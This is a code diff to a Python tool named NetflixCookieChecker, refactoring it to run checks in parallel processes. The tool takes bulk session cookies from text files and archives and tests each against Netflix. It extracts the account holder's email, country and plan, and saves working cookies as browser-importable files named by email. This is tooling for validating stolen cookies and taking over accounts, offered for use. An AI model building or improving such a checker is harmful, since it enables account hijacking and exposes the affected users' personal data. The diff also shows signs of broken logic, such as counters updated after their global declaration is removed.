@@ -7,7 +7,7 @@ import shutil
 import uuid
 import zipfile
 import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ProcessPoolExecutor, as_completed
 from http.cookies import SimpleCookie
 from bs4 import BeautifulSoup
 import hashlib
@@ -139,7 +139,6 @@ class NetflixCookieChecker:
                     email = react_context.get('models', {}).get('memberContext', {}).get('data', {}).get('email', 'N/A')
                 if email == 'N/A': raise AttributeError
             except (AttributeError, json.JSONDecodeError, KeyError):
-                log("Primary email extraction failed, using fallback.")
                 email = self.get_email_from_security_page(headers, cookie_dict) or 'N/A'
             info['email'] = email
             
@@ -159,11 +158,82 @@ class NetflixCookieChecker:
             return True, info
 
         except requests.RequestException as e:
-            log(f"Login valid, but failed to get account details: {e}")
             return True, info
+# --- NEW: Worker function for ProcessPoolExecutor ---
+def worker_process_single_cookie(args):
+    """Worker function to process one cookie dictionary in a separate process."""
+    cookie_dict, source_filename, temp_results_dir = args
+    
+    # Create checker instance in this process
+    checker = NetflixCookieChecker()
+    
+    try:
+        is_valid, info = checker.validate_and_get_info(cookie_dict)
+        
+        if is_valid:
+            email = info.get('email', 'N/A')
+            
+            # Create filename for valid cookie
+            filename = (
+                f"[{info.get('country', 'N/A')}]"
+                f"[{info.get('email', 'N/A')}]"
+                f"[{info.get('plan', 'NULL')}]"
+                f"[{info.get('extra_member', 'false')}].txt"
+            )
+            filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
+            
+            # Save valid cookie
+            valid_dir = os.path.join(temp_results_dir, 'valid_cookies')
+            os.makedirs(valid_dir, exist_ok=True)
+            output_path = os.path.join(valid_dir, filename)
+            
+            payload = []
+            for name, value in cookie_dict.items():
+                secure = name in SECURE_HTTPONLY_NAMES
+                http_only = name in SECURE_HTTPONLY_NAMES
+                payload.append({
+                    "name": name, "value": value, "domain": ".netflix.com", 
+                    "path": "/", "secure": secure, "httpOnly": http_only
+                })
 
-# --- Initialize Checker ---
-netflix_checker = NetflixCookieChecker()
+            with open(output_path, 'w', encoding='utf-8') as f:
+                json.dump(payload, f, ensure_ascii=False, separators=(',', ': '))
+            
+            return ("valid", email, info, os.path.basename(output_path))
+        else:
+            error_msg = info.get('error', 'Unknown error')
+            
+            # Save invalid cookie
+            filename = os.path.basename(source_filename)
+            filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
+            
+            invalid_dir = os.path.join(temp_results_dir, 'invalid_cookies')
+            os.makedirs(invalid_dir, exist_ok=True)
+            output_path = os.path.join(invalid_dir, filename)
+
+            payload = []
+            for name, value in cookie_dict.items():
+                secure = name in SECURE_HTTPONLY_NAMES
+                http_only = name in SECURE_HTTPONLY_NAMES
+                payload.append({
+                    "name": name, "value": value, "domain": ".netflix.com", 
+                    "path": "/", "secure": secure, "httpOnly": http_only
+                })
+            
+            # Add the error message to the saved JSON for context
+            invalid_data = {
+                "error": error_msg,
+                "source_file": os.path.basename(source_filename),
+                "cookie_data": payload
+            }
+
+            with open(output_path, 'w', encoding='utf-8') as f:
+                json.dump(invalid_data, f, ensure_ascii=False, indent=4)
+            
+            return ("invalid", error_msg, source_filename)
+            
+    except Exception as e:
+        return ("error", str(e), source_filename)
 
 # --- Cookie Parsing Functions ---
 def _parse_cookie_header_format(cookie_str: str):
@@ -219,110 +289,13 @@ def parse_input_to_cookie_list(file_content: str):
     else:
         log("No specific format detected, attempting simple Key=Value parsing.")
         return [d for d in (parse_cookie_line(line) for line in lines) if d]
-
-def _save_valid_cookie_with_info(cookie_dict, info):
-    global temp_results_dir
-    filename = (
-        f"[{info.get('country', 'N/A')}]"
-        f"[{info.get('email', 'N/A')}]"
-        f"[{info.get('plan', 'NULL')}]"
-        f"[{info.get('extra_member', 'false')}].txt"
-    )
-    
-    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
-    
-    # Use temp directory instead of fixed directory
-    valid_dir = os.path.join(temp_results_dir, 'valid_cookies')
-    os.makedirs(valid_dir, exist_ok=True)
-    output_path = os.path.join(valid_dir, filename)
-    
-    payload = []
-    for name, value in cookie_dict.items():
-        secure = name in SECURE_HTTPONLY_NAMES
-        http_only = name in SECURE_HTTPONLY_NAMES
-        payload.append({"name": name, "value": value, "domain": ".netflix.com", "path": "/", "secure": secure, "httpOnly": http_only})
-
-    with open(output_path, 'w', encoding='utf-8') as f:
-        json.dump(payload, f, ensure_ascii=False, separators=(',', ': '))
-    
-    return output_path
-
-def _save_invalid_cookie(cookie_dict, error_message, source_filename="unknown_source"):
-    """
-    Saves an invalid cookie to the invalid_cookies directory in temp folder.
-    """
-    global temp_results_dir
-    # Get just the base filename (e.g., "1.txt" from "/path/to/1.txt")
-    filename = os.path.basename(source_filename)
-    
-    # Sanitize the filename to be safe for file paths
-    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
-    
-    invalid_dir = os.path.join(temp_results_dir, 'invalid_cookies')
-    os.makedirs(invalid_dir, exist_ok=True)
-    output_path = os.path.join(invalid_dir, filename)
-
-    payload = []
-    for name, value in cookie_dict.items():
-        secure = name in SECURE_HTTPONLY_NAMES
-        http_only = name in SECURE_HTTPONLY_NAMES
-        payload.append({"name": name, "value": value, "domain": ".netflix.com", "path": "/", "secure": secure, "httpOnly": http_only})
-    
-    # Add the error message to the saved JSON for context
-    invalid_data = {
-        "error": error_message,
-        "source_file": os.path.basename(source_filename),
-        "cookie_data": payload
-    }
-
-    with open(output_path, 'w', encoding='utf-8') as f:
-        json.dump(invalid_data, f, ensure_ascii=False, indent=4)
-    
-    return output_path
-
-def process_single_cookie(cookie_dict, total_cookies, source_filename="unknown_source"):
-    """Worker function to process one cookie dictionary."""
-    global valid_count, invalid_count, checked_count
-    if stop_flag:
-        return
-
-    is_valid, info = netflix_checker.validate_and_get_info(cookie_dict)
-    
-    with check_lock:
-        checked_count += 1
-        if is_valid:
-            email = info.get('email', 'N/A')
-            
-            # Check if the account was already saved in this run or from a previous run
-            if email != 'N/A' and email in saved_emails:
-                # This is an existing account, so we are updating it.
-                path = _save_valid_cookie_with_info(cookie_dict, info)
-                log(f"🔄 UPDATED: Refreshed cookie for {email}")
-            else:
-                # This is a brand new valid account.
-                valid_count += 1
-                if email != 'N/A':
-                    saved_emails.add(email)
-                
-                path = _save_valid_cookie_with_info(cookie_dict, info)
-                log(f"💾 NEW: {os.path.basename(path)}")
-        else:
-            invalid_count += 1
-            error_msg = info.get('error', 'Unknown error')
-            _save_invalid_cookie(cookie_dict, error_msg, source_filename) 
-            log(f"❌ INVALID: {error_msg} (from {os.path.basename(source_filename)})")
-
-        # Update progress
-        progress = checked_count / total_cookies
-        log(f'Progress: {checked_count}/{total_cookies} | Valid: {valid_count} | Invalid: {invalid_count}')
-
-# --- REVISED: run_check_on_file_list supports live yields ---
+# --- REVISED: run_check_on_file_list using ProcessPoolExecutor ---
 def run_check_on_file_list(file_paths, live=False):
     """
-    Reads a list of .txt files, parses all cookies, and then runs the checker.
+    Reads a list of .txt files, parses all cookies, and then runs the checker using ProcessPoolExecutor.
     This is the main orchestrator for the checking process.
     """
-    global temp_results_dir, stop_flag, valid_count, invalid_count, checked_count, saved_emails
+    global temp_results_dir, stop_flag
     
     # Initialize counters
     stop_flag = False
@@ -333,7 +306,6 @@ def run_check_on_file_list(file_paths, live=False):
     temp_results_dir = f"temp_results_{uuid.uuid4().hex}"
     os.makedirs(temp_results_dir, exist_ok=True)
     
-    all_cookies_to_check = []
     cookies_with_sources = [] 
 
     for file_path in file_paths:
@@ -349,7 +321,7 @@ def run_check_on_file_list(file_paths, live=False):
             if cookies_from_file:
                 log(f"  -> Found {len(cookies_from_file)} cookie(s) in this file.")
                 for cookie_dict in cookies_from_file:
-                    cookies_with_sources.append((cookie_dict, file_path))
+                    cookies_with_sources.append((cookie_dict, file_path, temp_results_dir))
             else:
                 log(f"  -> No valid cookie formats found in this file.")
 
@@ -367,16 +339,49 @@ def run_check_on_file_list(file_paths, live=False):
     log(f'Found a total of {total_to_check} cookies to check across all files.')
 
     try:
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            futures = {executor.submit(process_single_cookie, c_dict, total_to_check, s_path):(c_dict, s_path) 
-                       for c_dict, s_path in cookies_with_sources}
+        # Use ProcessPoolExecutor with max_workers processes
+        with ProcessPoolExecutor(max_workers=5) as executor:
+            futures = {executor.submit(worker_process_single_cookie, args): args 
+                      for args in cookies_with_sources}
+            
             for future in as_completed(futures):
                 if stop_flag:
                     executor.shutdown(wait=False, cancel_futures=True)
                     break
-                future.result()
-                if live:
-                    yield (checked_count, total_to_check, valid_count, invalid_count)
+                
+                try:
+                    result = future.result()
+                    checked_count += 1
+                    
+                    if result[0] == "valid":
+                        valid_count += 1
+                        email = result[1]
+                        if email != 'N/A':
+                            if email in saved_emails:
+                                log(f"🔄 UPDATED: Refreshed cookie for {email}")
+                            else:
+                                saved_emails.add(email)
+                                log(f"💾 NEW: {result[3]}")
+                        else:
+                            log(f"💾 NEW: {result[3]}")
+                    elif result[0] == "invalid":
+                        invalid_count += 1
+                        log(f"❌ INVALID: {result[1]} (from {os.path.basename(result[2])})")
+                    else:  # error
+                        invalid_count += 1
+                        log(f"❌ ERROR: {result[1]} (from {os.path.basename(result[2])})")
+                    
+                    # Update progress
+                    progress = checked_count / total_to_check
+                    log(f'Progress: {checked_count}/{total_to_check} | Valid: {valid_count} | Invalid: {invalid_count}')
+                    
+                    if live:
+                        yield (checked_count, total_to_check, valid_count, invalid_count)
+                        
+                except Exception as e:
+                    log(f"Error processing result: {e}")
+                    invalid_count += 1
+                    checked_count += 1
 
         if stop_flag:
             log('⏹️ Checking stopped by user.')
@@ -422,7 +427,7 @@ def process_file_and_check(input_file, live=False):
         elif file_ext == '.rar':
             log(f"📦 RAR archive detected. Extracting...")
             try:
-                rarfile.UNRAR_TOOL = "/usr/bin/unrar"
+                rarfile.UNRAR_TOOL = "UnRAR.exe"
                 os.makedirs(extract_dir, exist_ok=True)
                 with rarfile.RarFile(input_file, 'r') as rar_ref:
                     rar_ref.extractall(extract_dir)
@@ -439,7 +444,6 @@ def process_file_and_check(input_file, live=False):
             if live:
                 yield (0, 0, 0, 0, None)
             return None
-
         if not txt_file_paths:
             log("❌ No .txt files found to process.")
             if live:
@@ -447,11 +451,15 @@ def process_file_and_check(input_file, live=False):
             return None
         
         log(f"Found {len(txt_file_paths)} .txt file(s) to process.")
-        results = run_check_on_file_list(txt_file_paths, live=live)
+        
+        # Call the revised run_check_on_file_list function
         if live:
-            yield from results
+            # Generator mode - yield results as they come
+            for result in run_check_on_file_list(txt_file_paths, live=True):
+                yield result
         else:
-            return results
+            # Non-generator mode - return final result
+            return run_check_on_file_list(txt_file_paths, live=False)
 
     finally:
         # Clean up extraction directory
@@ -468,10 +476,14 @@ def main(file_paths):
     results_dir = process_file_and_check(file_paths[0])
     return results_dir
 
+# --- For multiprocessing support on Windows ---
 if __name__ == "__main__":
+    # This is required for ProcessPoolExecutor on Windows
+    import multiprocessing
+    multiprocessing.freeze_support()
+    
     # Test with local file
     test_files = ["test_cookies.txt"]
     results = main(test_files)
     if results:
         print(f"Results saved to: {results}")
-
